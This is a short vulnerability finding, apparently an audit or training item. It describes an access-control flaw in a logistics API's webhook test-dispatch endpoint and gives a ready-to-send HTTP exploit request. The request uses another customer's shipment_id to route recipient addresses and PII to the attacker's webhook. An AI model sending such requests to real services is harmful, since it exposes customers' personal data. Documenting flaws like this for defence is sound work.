diagnosis: The view accepts an arbitrary shipment_id and dispatches the shipment's recipient PII and tracking details to the caller's registered webhook endpoints. Because the view fails to verify that the shipment belongs to request.user or their shipping client account, an attacker can specify another customer's shipment_id and harvest delivery addresses directly via their outbound webhook listener.
exploit_request:
POST /api/logistics/webhooks/test-dispatch/ HTTP/1.1
Host: logistics.trackhub.net
Authorization: Bearer <attacker_driver_jwt>
Content-Type: application/json

{"shipment_id": 984120}
